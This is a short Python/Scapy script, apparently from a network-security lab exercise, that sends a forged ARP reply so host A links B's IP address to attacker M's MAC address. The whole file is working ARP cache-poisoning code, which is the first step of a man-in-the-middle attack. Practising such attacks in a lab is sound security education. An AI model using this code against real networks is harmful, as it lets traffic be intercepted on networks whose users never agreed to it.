#!/usr/bin/env python3
from scapy.all import *

def send_arp_reply(target_ip, target_mac, fake_ip, fake_mac):
    ether = Ether(dst=target_mac, src=fake_mac)
    arp = ARP(hwsrc=fake_mac, psrc=fake_ip, pdst=target_ip, op=2)  # ARP reply (op=2)
    pkt = ether/arp
    sendp(pkt)

# Scenario 1: B’s IP is already in A’s cache.
target_ip_a = "10.9.0.5"#place with A's IP address
target_mac_a = "02:42:0a:09:00:05"  # Replace with A's MAC address
fake_ip_m = "10.9.0.6"  # Replace with B's IP address
fake_mac_m = "02:42:0a:09:00:69"  # Replace with M's MAC address

send_arp_reply(target_ip_a, target_mac_a, fake_ip_m, fake_mac_m)
